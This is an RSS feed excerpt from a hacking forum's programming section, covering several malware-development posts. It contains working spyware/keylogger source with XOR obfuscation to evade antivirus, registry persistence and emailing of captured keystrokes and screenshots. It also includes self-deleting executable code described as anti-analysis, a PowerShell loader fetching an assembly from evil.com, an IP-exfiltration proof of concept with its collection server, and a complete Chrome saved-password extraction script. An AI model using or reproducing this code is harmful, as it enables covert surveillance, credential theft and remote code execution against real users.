          <title>IP generator bash script help</title>
          <dc:creator><![CDATA[C_J]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello all, I am working on a script to randomly generate IP addresses and then try to ssh to all of them. When I run the script I get : <code>ssh printf %d.%d.%d.%dn 141 138 75 224</code></p>
<p>My code:</p>
<pre><code class="lang-auto">for i in {1..100}
do
 STR="printf "%d.%d.%d.%d\n" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))" "$((RANDOM % 256))""
done
while true; do
    read -p "Start SSH connection? " yn
    case $yn in
        [Yy]* ) echo ssh $STR; break;;
        [Nn]* ) exit;;
        * ) echo "Invalid Input";;
    esac
done
</code></pre>
<p>Could you please help me?</p>
<p>Thanks!</p>
            <p><small>9 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/ip-generator-bash-script-help/33765">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/ip-generator-bash-script-help/33765</link>
          <pubDate>Mon, 06 Mar 2023 15:51:08 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-33765</guid>
          <source url="https://0x00sec.org/t/ip-generator-bash-script-help/33765.rss">IP generator bash script help</source>
        </item>
        <item>
          <title>Self Deleting Executables</title>
          <dc:creator><![CDATA[0xf00]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>In this post, I’ll provide an example of self-deleting programs, as well as the different ways it can be used, and finally a detailed explanation.  The first example is for Windows (OS), which create a temporary file and use it to delete the original executable, The second example is  Linux based simply uses built in functions to initiate the self-deletion process.</p>
<h2>
<a name="example-01-1" class="anchor" href="https://0x00sec.org#example-01-1"></a>Example 01</h2>
<p>This program can help make sure that any executables that are created are removed from the system once their job is complete.</p>
<pre><code class="lang-auto">int 
CommitSuicide(char *szCmdLine)

{
HANDLE hTemp;
char szPath[MAX_PATH];
char szTemp[MAX_PATH];

static BYTE buf[1024];
STARTUPINFO si;
PROCESS_INFORMATION pi;
UINT ret;

//open a temporary file
GetTempPath(MAX_PATH, szTemp);
lstrcat(szTemp, "suicide.exe");

GetModuleFileName(0, szPath, MAX_PATH);
CopyFile(szPath, szTemp, FALSE);


hTemp = CreateFile(szTemp, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE, 0,

OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, 0);


//Create a process using the temporary executable. This will cause

//the file's handle count to increase, so we can close it.

ZeroMemory(&amp;si, sizeof(STARTUPINFO));
ZeroMemory(&amp;pi, sizeof(PROCESS_INFORMATION));  

ZeroMemory(&amp;si, sizeof(STARTUPINFO));

si.cb = sizeof(STARTUPINFO);


lstrcat(szTemp, " ");
lstrcat(szTemp, szCmdLine);

ret = CreateProcess(0, szTemp, 0, 0, FALSE, NORMAL_PRIORITY_CLASS, 0, 0, &amp;si, &amp;pi);

//Close our handle to the new process. Because the process is

//memory-mapped, there will still be a handle held by the O/S, so

//it won't get deleted. Give the other process a chance to run..

Sleep(100);

CloseHandle(hTemp);
  
return 0;

}
</code></pre>
<ul>
<li>When it’s time to delete ourselves we first spawns a new process using that file, and then deletes the temporary file. Calling <code>szCmdLine</code> as its input parameter which creates a temporary file in the system’s tmp directory and copies the current executable file to that tmp file finally creates a new process using the temporary file, waits for  <code>Sleep();</code> and then closes the handle to the tmp file</li>
</ul>
<pre><code class="lang-auto">int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, PSTR szCmdLine, int iCmdShow)

{

char szPath[MAX_PATH];

//

// Parse the command line

// Normally, we should not be run with any paramters

// We re-spawn ourselves with the current module's path

//

if(szCmdLine[0] == '\0')

{

// Spawn a duplicate process, and tell it to delete US

HMODULE hModule = GetModuleHandle(0);

GetModuleFileName(hModule, szPath, MAX_PATH);

CommitSuicide(szPath);

// Exit normally
return 0;

}

// This is where we pick up execution second time we run,

// When a filename has been specified on the command line

else

{

// Give the calling process time to exit...

Sleep(200);

// Delete the file specified on command line.

DeleteFile(szCmdLine);

// Exit normally. When we close, this executable will be automatically

return 0;

	}
}
</code></pre>
<ul>
<li>Next, we check if any command line parameters have been passed we <code>Sleep();</code> and then deletes the file specified by the command line parameter if none we re-spawn the path of the current executable file as a command line parameter.</li>
</ul>
<h2>
<a name="example-02-2" class="anchor" href="https://0x00sec.org#example-02-2"></a>Example 02</h2>
<p>This actually a simple one this function deletes the current executable by obtaining its path <code>readlink</code> and calling the <code>unlink</code> .</p>
<pre><code class="lang-auto">void 
CommitSuicide() {
    char path[256];
    int status;

    // Get the path of the current program
    status = readlink("/proc/self/exe", path, sizeof(path) - 1);
    if (status == -1) {
        exit(EXIT_FAILURE);
    }
    path[status] = '\0';

    // Copy the executable to a temporary file
    char tmp_path[] = "/tmp/XXXXXX";
    int fd = mkstemp(tmp_path);
    if (fd == -1) {
        exit(EXIT_FAILURE);
    }
    if (write(fd, path, status) != status) {
        exit(EXIT_FAILURE);
    }
    close(fd);

    // Launch the temporary executable as a new process
    if (fork() == 0) {
        execl(tmp_path, "", NULL);
    }

    // Delete the original executable
    unlink(path);

    // Exit the current process
    exit(EXIT_SUCCESS);
}

int main() {
    CommitSuicide();
    return 0;
}
</code></pre>
<p>The general idea is to create a temporary copy of the executable file, launch it as a new process, and then delete the original executable before the new process terminates, This can be used as an anti-analysis technique since the executable file will no longer be available after <code>CommitSuicide</code> function gets called.</p>
<p>That’s all for now. I hope you learned something from this. Please feel free to share any techniques or thought</p>
<h2>
<a name="references-3" class="anchor" href="https://0x00sec.org#references-3"></a>References</h2>
<aside class="onebox allowlistedgeneric" data-onebox-src="https://www.catch22.net/tuts/win32/self-deleting-executables">
  <header class="source">

      <a href="https://www.catch22.net/tuts/win32/self-deleting-executables" target="_blank" rel="noopener nofollow ugc" title="12:00AM - 01 October 2001">Catch22 – 1 Oct 01</a>
  </header>

  <article class="onebox-body">
    

<h3><a href="https://www.catch22.net/tuts/win32/self-deleting-executables" target="_blank" rel="noopener nofollow ugc">Self-deleting Executables</a></h3>

  <p>This is a subject that tends to come up every so often in the newsgroups, so I thought I’d write an article about the techniques I’ve collected to enable an executable to delete itself from disk (whilst running, that is). There is very little...</p>


  </article>

  <div class="onebox-metadata">
    
    
  </div>

  <div style="clear: both"></div>
</aside>

            <p><small>10 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/self-deleting-executables/33702">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/self-deleting-executables/33702</link>
          <pubDate>Fri, 03 Mar 2023 00:29:57 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-33702</guid>
          <source url="https://0x00sec.org/t/self-deleting-executables/33702.rss">Self Deleting Executables</source>
        </item>
        <item>
          <title>Writing My first SpyWare for learning C/C++</title>
          <dc:creator><![CDATA[landi58]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hi All,<br>
I have created my first ever Spyware in C/C++ (I have named it Polynomial Spylog) . I have created this as a project to learn more C/C++. My intention is not to use this for malicious purposes but just for learning purposes.<br>
Although I already have good knowledge of both of these languages but I mostly wrote algorithms and data structures implementation programs in these languages (Basically I mostly write C/C++ codes in competitive programming).<br>
But, I wanted to implement something that will work in real time. So I decided to create this project.</p>
<p>Note:-</p>
<ol>
<li>This Spyware will work only in Windows OS.</li>
<li>All major Function names and registry names are XOR encoded to avoid AV static detection.</li>
<li>To decode encoded names, use “DecryptXOR” Function provided along with 4 as a “Key”.</li>
</ol>
<p>**DISCLAIMER : **<br>
<strong>OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON’T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.</strong></p>
<p><strong>FEATURES OF POLYNOMIAL SPYLOG</strong><br>
. **Discrete/Tamper Proof :**By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees .</p>
<p>. <strong>Keystrokes Typed:</strong> See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail.</p>
<p>. <strong>Continuous Screenshots:</strong> will Capture desktop screen-shots after a given 7 seconds (u are free to change time interval according to requirements).</p>
<p>. <strong>Email Sending:</strong> Screenshot and keylogger Logfile which contain sensitive user information send to registered email (Gmail only) (Mobile/Web/System). Script to send email is also written in C++.</p>
<p>. <strong>AutoStart :</strong> Keylogger has functionality to auto execute on system bootup. It Insert entry on system start-up program when it is running.</p>
<p>. <strong>AutoCopy :</strong> Keylogger has functionality to auto copy in %appdata%/roaming/Microsoft/CLR (The directory will be created at the time of first time execution).</p>
<p>CODE EXPLAINATION (I will only explain main functions):-</p>
<ol>
<li><strong>Function to automatically copy Exe file to %app% folder.</strong></li>
</ol>
<pre><code class="lang-auto">void AutoCopy() {

	userlc = IO::GetOurPath(true);//Creating directory
	string f_path = userlc;
	string f_name = f_path;
	char encrName[] = "wrglkwp*a|a"; //XOR encoded Exe name. 
	DecryptXOR((char*)encrName, strlen(encrName), encryption_key);
	f_name += string(encrName);//file name
	char my_name[260];
	GetModuleFileNameA(GetModuleHandle(0), my_name, 260);//name of running process
	string f_my = my_name;
	CreateDirectoryA(f_path.c_str(), NULL);
	CopyFileA(f_my.c_str(), f_name.c_str(), FALSE);

}
</code></pre>
<ol start="2">
<li>
<strong>Function for autorun.</strong><br>
This is easy function do I will not explain the whole function code here. This function is just writing Exe file path to registry key to register it for auto start.<br>
I will only explain function pointer names used in this function.<br>
pRgOpn, pRgSet and pRgClose are registry key function pointers. All Functions are from “Advapi32.dll” Library.<br>
I have used function pointers to call them directly from DLL to implement runtime function binding (again, Because of AV issues).</li>
</ol>
<p><strong>Function pointer for RegOpenKeyExW:-</strong></p>
<pre><code class="lang-auto">typedef LSTATUS(__stdcall* pRgOpn)(
	IN           HKEY,
	IN			 LPCWSTR,
	IN           DWORD,
	IN           REGSAM,
	OUT          PHKEY
	);
</code></pre>
<p><strong>Function  pointer for RegSetValueExA:-</strong></p>
<pre><code class="lang-auto">typedef LSTATUS(__stdcall* pRgSet)(
	IN           HKEY,
	IN          LPCSTR,
	DWORD      Reserved,
	IN           DWORD,
	IN           const BYTE*,
	IN           DWORD
	);
</code></pre>
<p><strong>Function  pointer for RegCloseKey:-</strong></p>
<pre><code class="lang-auto">typedef LSTATUS(__stdcall* pRgClose)(
	IN           HKEY
	);
</code></pre>
<ol start="3">
<li><strong>Creating hook procedure to intercept Key board events.</strong></li>
</ol>
<pre><code class="lang-auto">HHOOK eHook = NULL;//The is a handle to hook variable

static bool InstallHook() {

    /*
    A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
    A function that intercepts a particular type of event is known as a hook procedure.
    A hook procedure can act on each event it receives, and then modify or discard the event.
    */

    Helper::WriteAppLog("Hook started... Timer started");
    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
    return eHook == NULL;
    /*WH_KEYBOARD :- we use Keyboard hook, LL means Low level
    OurKeyboardProc = Procedure invoked by the hook system when every time user pressed the key on keyboard
    we are converting this because SetWindowsHookEx accept handle to hook procedure
    */
}
</code></pre>
<p>Key board Hook Procedure. I have explained most of the things in code comments.</p>
<pre><code class="lang-auto">
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {//This function will be called everytime a key is pressed on keyboard
    Helper::WriteAppLog(" In Keyboard Proc Func");
    if (nCode &lt; 0) {
        CallNextHookEx(eHook, nCode, wparam, lparam);
    }

    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;//KBDLLHOOKSTRUCT have to see on internet

    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {//This is just pressing the key and holding it..not pressing the key and releasing the key
        keylog += Keys::KEYS[kbs-&gt;vkCode].Name;
        if (kbs-&gt;vkCode == VK_RETURN) {
            keylog += '\n';
        }
    }
    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {//This is for that keys are released after pressing
       //we are only interested in releasing of special keys like shift
       //we want to store like [shift(pressed)][a][b][/shift(released)]
       // so we will know what letters was pressed while key shift was pressed
        DWORD key = kbs-&gt;vkCode;
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT
            || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU
            || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
            std::string KeyName = Keys::KEYS[kbs-&gt;vkCode].Name;
            KeyName.insert(1, "/");//appending back slash to represent release of key
            keylog += KeyName;
        }
    }
    std::string last_file_name = IO::Writelog(keylog); //Writing Actual Key Logs to file.
    //keyLogsAll += keylog;
    keylog = "";
    return CallNextHookEx(eHook, nCode, wparam, lparam);

}
</code></pre>
<ol start="4">
<li>
<strong>Function  to Send Mail after specified interval time.</strong><br>
This is a large Function  but this is an easy Functions. I will only explain main parts from this Function .<br>
Please let me know in comments if anyone found something not understandable in this function.</li>
</ol>
<pre><code class="lang-auto">
std::string txtkeyLogFile = std::string(LOG_FILE); //Getting Log file name with path.
std::string attachs = IO::GetOurPath(true) + last_file + "::" + fullPathOfImage1; // making attachment string by appending attachments paths

TCHAR txtFileNameToAttach[MAX_PATH];
_tcscpy_s(txtFileNameToAttach, CA2T(txtkeyLogFile.c_str()));
//ZipAdd Function  accepts TCHAR parameter, so converting Log file path string to TCHAR and copying attachments string to TCHAR variable.
ZipAdd(hz, txtFileNameToAttach, txtFileNameToAttach); //Adding Log File in Zip File.

//Adding all images from imgFileNames vector to Zip File
for (long I = 0; I &lt; imgFileNames.size(); i++) {
	TCHAR imgFileToAttach[MAX_PATH];
	_tcscpy_s(imgFileToAttach, CA2T(imgFileNames[i].c_str()));
	ZipAdd(hz, imgFileToAttach, imgFileToAttach);
}

//API Function  to send mail with attachments using CURL (will explain this function later) .
curlSendMail::sendFinalmail(_TO, _FROM, username,  _PASSWORD, zipfileWithPath, std::string(ZIP_FILE));

if (dwFileSize &gt;= 1000000) { //clear the file if file size become greater than 1 MB
	ofstream myfile;
	myfile.open(last_file);
	if (myfile.is_open()) {
		myfile &lt;&lt; ""; //Emptying the file
		oldSize = 0;
		myfile.close();
	}
}
</code></pre>
<ol start="5">
<li>
<p><strong>Function to Capture screen shots.</strong><br>
All the functionality of Screenshot capturing is written in “Screenshots.h” file.<br>
Function is little large so I am not explaining it here. However, it is using Windows API GDI and DC to create Bitmaps of screen pixels and save them in app folder.</p>
</li>
<li>
<p><strong>Function to send mail with attachment</strong><br>
There are Couple of functions I have written for this purpose. However, I will explain only main function here.</p>
</li>
</ol>
<pre><code class="lang-auto">namespace curlSendMail {
    int sendFinalmail(std::string _ToEMail, std::string _FromEMail, std::string&amp; _loginUserName, std::string&amp; _loginPassword, 
        std::string&amp; _FileNameWithPath, const std::string&amp; _fileNameWithoutPath = "attachement.zip")
    {
        TO = std::move(_ToEMail);
        FROM = std::move(_FromEMail);
        FILENAME = std::move(_FileNameWithPath);
        char currDir[MAX_PATH_SZ];
        GetCurrentDirectoryA(MAX_PATH_SZ, currDir);

        std::string FULL_FILENAME = FILENAME;

        std::string fullFilePath = std::string(currDir) + "\\" + _fileNameWithoutPath;

        CopyFileA(FULL_FILENAME.c_str(), fullFilePath.c_str(), FALSE);

        CURL* curl;
        CURLcode res = CURLE_OK;
        struct curl_slist* recipients = NULL;
        struct fileBuf_upload_status file_upload_ctx;
        size_t file_size(0);

        file_upload_ctx.lines_read = 0;


        curl = curl_easy_init();
        file_size = read_file();
        if (curl)
        {
            curl_easy_setopt(curl, CURLOPT_USERNAME, _loginUserName.c_str()); //setting Gmail username
            curl_easy_setopt(curl, CURLOPT_PASSWORD, _loginPassword.c_str()); //settings Gmail password
            curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587"); //Gmail's smtp address
            curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
            //curl_easy_setopt(curl, CURLOPT_CAINFO, "google.pem");
            curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM.c_str()); //Sender email address
            recipients = curl_slist_append(recipients, TO.c_str()); 
            curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients); //Recipient Email address
            curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size); 
            curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
            curl_easy_setopt(curl, CURLOPT_READDATA, &amp;file_upload_ctx);
            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L); //flag to indicate attachment
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //Don’t display Curl Connection data Change 1L to 0

            res = curl_easy_perform(curl);

            if (res != CURLE_OK)
                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
            curl_slist_free_all(recipients);
            curl_easy_cleanup(curl);
        }
        delete[] fileBuf;
        //std::cin.get();
        return (int)res;
    }
}
</code></pre>
<p>Thats it. However, There are couple of other functions also that I have not mentioned here. I have implemented multithreading so that both screenshot capturing and key log saving tasks can be executed parallelly.<br>
Please note that this is my first technical writeup so apologies for any mistakes. Please do mention in “reply” any improvements and suggestions. I will take care of them in my future writeups.<br>
Further, Please point out any mistakes or suggestions or any improvements in this project. I will rectify them.<br>
Please feel free to contribute to this project. I have mentioned GitHub link of this project (my GitHub account is with my real name LOL).<br>
Please don’t use this tool for malicious activities. I am not responsible for any of the activities performed by anyone using this tool.</p>
<p>Github Link:- <a href="https://github.com/ravijotsingh58/polynomial-spylog" class="inline-onebox" rel="noopener nofollow ugc">GitHub - ravijotsingh58/polynomial-spylog: Keylogger is 100% invisible keylogger not only for users, but also undetectable by antivirus software. polynomial spylog Monitors all keystokes. It has a seperate process which continues capture system screenshot and send to registered gmail in given time.</a></p>
<p>And Always Love C and C++<br>
<em>Polynomial</em></p>
            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521</link>
          <pubDate>Fri, 16 Dec 2022 14:18:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-32521</guid>
          <source url="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss">Writing My first SpyWare for learning C/C++</source>
        </item>
        <item>
          <title>Powershell In-File Execution of C# Code</title>
          <dc:creator><![CDATA[camel]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <h1>
<a name="introduction-1" class="anchor" href="https://0x00sec.org#introduction-1"></a>Introduction</h1>
<p>Some time ago I watched <a href="https://www.youtube.com/watch?v=EwEwRLedeKI" rel="noopener nofollow ugc">John Hammond’s video on this topic</a> and thought this would a be cool method to minify and showcase.</p>
<h4>
<a name="disclaimer-i-am-a-beginner-to-malware-development-c-and-powershell-i-would-appreciate-criticism-2" class="anchor" href="https://0x00sec.org#disclaimer-i-am-a-beginner-to-malware-development-c-and-powershell-i-would-appreciate-criticism-2"></a>Disclaimer: I am a beginner to malware development, C#, and Powershell, I would appreciate criticism.</h4>
<h1>
<a name="explanation-3" class="anchor" href="https://0x00sec.org#explanation-3"></a>Explanation</h1>
<p>Firstly, we need to understand the most common way of loading C#, via an executable:</p>
<ul>
<li>
<p>Fetch executable content and encapsulate in a byte array.</p>
</li>
<li>
<p>Load executable content using [System.Reflection.Assembly]::load() method.</p>
</li>
<li>
<p>Use Reflection to execute our loaded assembly.</p>
</li>
</ul>
<p>The code below follows these steps:</p>
<pre><code class="lang-python">$bytes = (Invoke-WebRequest "https://evil.com/evilexe.exe").Content
$loadedAssembly = [System.Reflection.Assembly]::Load($bytes)

# Create entrypoint object and call it.

$entry = 
$loadedAssembly.GetType("NAMSPACE.CLASS_NAME").
   GetMethod('STATIC_METHOD_NAME', [Reflection.BindingFlags] 'Static, Public, NonPublic')

$entry.Invoke($null)
</code></pre>
<h2>
<a name="c-strings-4" class="anchor" href="https://0x00sec.org#c-strings-4"></a>C# Strings</h2>
<p>Instead of compiling and downloading an executable, why don’t we just supply a multiline string with our desired C# code and “load” it like so:</p>
<pre><code class="lang-python">Add-Type @"
using System;
 
public class Payload {
 
    static void Execute() {
        while (true) {
            Console.WriteLine("wow :O");
        }
    }
}
 
"@
 
$pl = New-Object Payload
 
$pl.Execute()
</code></pre>
<p>Now I know if you want to structure your code like a good programmer, with multiple files and DLLs, this looks a little bad. The big plus with this method is the fact you don’t need to download or store executable byte-arrays in your script.</p>
<h1>
<a name="proof-of-concept-ip-exfiltratorlogger-5" class="anchor" href="https://0x00sec.org#proof-of-concept-ip-exfiltratorlogger-5"></a>Proof of Concept: IP Exfiltrator/Logger</h1>
<p>As a simple proof of concept we will by building a basic IP logger, the script grabs the victims IP from <a href="https://ipinfo.io/ip" rel="noopener nofollow ugc">https://ipinfo.io/ip</a> and exfiltrates it to our evil URL. <img src="https://0x00sec.org/images/emoji/twitter/smiling_imp.png?v=12" title=":smiling_imp:" class="emoji" alt=":smiling_imp:" loading="lazy" width="20" height="20"></p>
<h2>
<a name="the-server-6" class="anchor" href="https://0x00sec.org#the-server-6"></a>The Server</h2>
<p>The server I wrote is written using a Python micro-framework known as Flask, you can find the code below:</p>
<pre><code class="lang-python">from flask import Flask, request

app = Flask(__name__)
database = [] # Psuedo database 


@app.route("/")
def index():
    ip = request.args.get("ip")
    print(f"[!] Grabbed IP: {ip}")
    database.append(ip)

    return "status: 200"

# Driver code
if __name__ == "__main__":
    app.run(port = 8080)
</code></pre>
<h2>
<a name="the-payload-7" class="anchor" href="https://0x00sec.org#the-payload-7"></a>The Payload</h2>
<p>In all honestly the payload could have been written better, requests could be handled through a single function instead of opening multiple HttpClient instances, but I have to remind myself this is just a PoC. The code is below:</p>
<pre><code class="lang-python">Add-Type @"
using System;
using System.Net.Http; 

public class Payload {
        public static string HandleGrab() {
                using (var client = new HttpClient()) {
                        var ipEp = new Uri("https://ipinfo.io/ip");
                        var res = client.GetAsync(ipEp).Result;

                        return res.Content.ReadAsStringAsync().Result;
                }
        }
 
        public static void Execute() {
                using (var client = new HttpClient()) {
                        var ipAddr = Payload.HandleGrab();

                        // Exfiltration process
                        var endpoint = new Uri($"http://localhost:8080/?ip={ipAddr}");
                        var res = client.GetAsync(endpoint).Result;
                        var resJson = res.Content.ReadAsStringAsync().Result;

                        Console.WriteLine(resJson);
                }
        }
}
"@

$pl = New-Object Payload

$pl.Execute()
</code></pre>
<p>If everything runs smoothly you should get a log like so:<br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/0/4/04cf8b9bf487eb23d3553b4f571a65c5626f8e43.png" alt="Server Screenshot" data-base62-sha1="GyzzsjQagJKAdRQpoMJpcheE39" width="550" height="52"></p>
<h1>
<a name="fin-8" class="anchor" href="https://0x00sec.org#fin-8"></a>Fin</h1>
<p>Hopefully someone found this at least interesting. <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=12" title=":slight_smile:" class="emoji" alt=":slight_smile:" loading="lazy" width="20" height="20"></p>
            <p><small>3 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888</link>
          <pubDate>Fri, 28 Oct 2022 16:50:18 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-31888</guid>
          <source url="https://0x00sec.org/t/powershell-in-file-execution-of-c-code/31888.rss">Powershell In-File Execution of C# Code</source>
        </item>
        <item>
          <title>Extract Chrome Passwords in Python</title>
          <dc:creator><![CDATA[seth_johnx]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Hello everyone ,   i m  having a little bit  confusion here  please  i  need  help  of  a  better  understanding<br>
i m  still  new  to  malware  and  exploit  development , i created  a  python script for  Extract Chrome Passwords in python  the  first  i  created  the  script  it  works  fine  the  code  are  right no  errors  and  the  result  was  printed  on  the  screen  and  it  okay  ,  but  the  problem  is  that  the  next day i  came  in  to  run  a  test  on  the  same script  yes  it works fine and  they  were  no  errors  on  my  code  but  the  problem is  that  the  result  was  not  printed  the  screen again  i  tried and  tried  but  the  script  only  execute  but  didn’t  print  result  on  the  screen  this  got  me  really  confuse  i  have  been  dealing  with  for days  now  i cant seen  to  fix  or  know  the  problem  please  help  me  out  .<br>
this  is  my  code    …</p>
<p>import os</p>
<p>import json</p>
<p>import base64</p>
<p>import sqlite3</p>
<p>import win32crypt</p>
<p>from Crypto.Cipher import AES</p>
<p>import shutil</p>
<p>from datetime import timezone, datetime, timedelta</p>
<p>def get_chrome_datetime(chromedate):</p>
<pre><code>return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
</code></pre>
<p>def get_encryption_key():</p>
<pre><code>local_state_path = os.path.join(os.environ["USERPROFILE"],

                                "AppData", "Local", "Google", "Chrome",

                                "User Data", "Local State")

                               

with open(local_state_path, "r", encoding="utf-8") as f:

    local_state = f.read()

    local_state = json.loads(local_state)

key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])

key = key[5:]



return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
</code></pre>
<p>def decrypt_password(password, key):</p>
<pre><code>try:

 

    iv = password[3:15]

    password = password[15:]

 

    cipher = AES.new(key, AES.MODE_GCM, iv)



    return cipher.decrypt(password)[:-16].decode()

except:

    try:

        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

    except:

         

        return ""
</code></pre>
<p>def main():</p>
<pre><code>key = get_encryption_key()

 

db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",

                        "Google", "Chrome", "User Data", "default", "Login Data")



filename = "ChromeData.db"

shutil.copyfile(db_path, filename)

# connect to the database

db = sqlite3.connect(filename)

cursor = db.cursor()

# `logins` table has the data we need

cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")

# iterate over all rows

for row in cursor.fetchall():

    origin_url = row[0]

    action_url = row[1]

    username = row[2]

    password = decrypt_password(row[3], key)

    date_created = row[4]

    date_last_used = row[5]        

    if username or password:

        print(f"Origin URL: {origin_url}")

        print(f"Action URL: {action_url}")

        print(f"Username: {username}")

        print(f"Password: {password}")

    else:

        continue

    if date_created != 86400000000 and date_created:

        print(f"Creation date: {str(get_chrome_datetime(date_created))}")

    if date_last_used != 86400000000 and date_last_used:

        print(f"Last Used: {str(get_chrome_datetime(date_last_used))}")

    print("="*50)

cursor.close()

db.close()

try:

    # try to remove the copied db file

    os.remove(filename)

except:

    pass</code></pre>
            <p><small>5 posts - 4 participants</small></p>
            <p><a href="https://0x00sec.org/t/extract-chrome-passwords-in-python/29482">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/extract-chrome-passwords-in-python/29482</link>
          <pubDate>Wed, 25 May 2022 14:40:15 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-29482</guid>
          <source url="https://0x00sec.org/t/extract-chrome-passwords-in-python/29482.rss">Extract Chrome Passwords in Python</source>
        </item>
        <item>
          <title>Need a little help with VBA scripting for Macros</title>
          <dc:creator><![CDATA[reddyrabbit]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>(topic deleted by author)</p>
            <p><small>1 post - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/need-a-little-help-with-vba-scripting-for-macros/27986">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/need-a-little-help-with-vba-scripting-for-macros/27986</link>
          <pubDate>Mon, 03 Jan 2022 14:46:11 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-27986</guid>
          <source url="https://0x00sec.org/t/need-a-little-help-with-vba-scripting-for-macros/27986.rss">Need a little help with VBA scripting for Macros</source>
        </item>
        <item>
          <title>Progamming for Wannabes XV. Crypters Part III</title>
          <dc:creator><![CDATA[0x00pf]]></dc:creator>
          <category>Programming</category>
          <description><![CDATA[
            <p>Finally we are going to get our crypter complete and operational. We have already covered the main technical areas involving ohow ton crypt binaries and now we just need to commit. We already have a complete crypter able to crypt the relevant parts of the code and inject our stub using different techniques. We are only missing the final version of our stub.</p>
<p>In this last instalment we are going to put together all the elements to get our <code>stub</code> complete.</p>
<h1>
<a name="what-does-that-stub-do-again-1" class="anchor" href="https://0x00sec.org#what-does-that-stub-do-again-1"></a>What does that <code>stub</code> do again?</h1>
<p>Before continuing, let’s recall what the <code>stub</code> does:</p>
<ul>
<li>Change permissions of the memory blocks we want to decrypt</li>
<li>Decrypt memory</li>
<li>Restore permissions</li>
<li>Give control to the Original Entry Point</li>
</ul>
